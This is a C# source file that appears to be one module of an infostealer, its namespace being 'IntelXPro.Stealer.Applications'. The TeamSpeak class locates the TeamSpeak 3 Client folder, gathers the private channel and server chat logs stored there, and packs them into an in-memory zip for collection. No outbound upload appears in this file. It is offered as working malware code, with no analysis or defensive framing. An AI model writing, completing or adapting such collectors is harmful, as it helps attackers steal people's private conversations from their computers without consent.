using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class TeamSpeak : ITarget
    {
        private readonly bool _collectChannelChats = true;

        private readonly bool _collectServerLogs = true;

        private readonly long _minFileSize = 50L;

        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = new string[2]
            {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "TeamSpeak 3 Client"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "TeamSpeak 3 Client")
            }.FirstOrDefault(Directory.Exists);
            if (string.IsNullOrEmpty(text))
            {
                return;
            }
            string path = Path.Combine(text, "config", "chats");
            if (!Directory.Exists(path))
            {
                return;
            }
            string[] directories = Directory.GetDirectories(path);
            if (directories == null || directories.Length == 0)
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "TeamSpeak";
            int num = 1;
            string[] array = directories;
            for (int i = 0; i < array.Length; i++)
            {
                string[] array2 = Directory.EnumerateFiles(array[i], "*.txt", SearchOption.TopDirectoryOnly).Where(delegate (string f)
                {
                    string fileName = Path.GetFileName(f);
                    if (string.IsNullOrEmpty(fileName))
                    {
                        return false;
                    }
                    if (!_collectChannelChats && fileName.StartsWith("channel", StringComparison.OrdinalIgnoreCase))
                    {
                        return false;
                    }
                    if (!_collectServerLogs && fileName.StartsWith("server", StringComparison.OrdinalIgnoreCase))
                    {
                        return false;
                    }
                    try
                    {
                        return new FileInfo(f).Length >= _minFileSize;
                    }
                    catch
                    {
                        return false;
                    }
                }).ToArray();
                if (array2.Length == 0)
                {
                    continue;
                }
                string[] array3 = array2;
                foreach (string text2 in array3)
                {
                    try
                    {
                        string text3 = $"TeamSpeak\\{num}\\" + Path.GetFileName(text2);
                        zip.AddFile(text3, File.ReadAllBytes(text2));
                        counterApplications.Files.Add(text2 + " => " + text3);
                    }
                    catch
                    {
                    }
                }
                num++;
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("TeamSpeak\\");
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
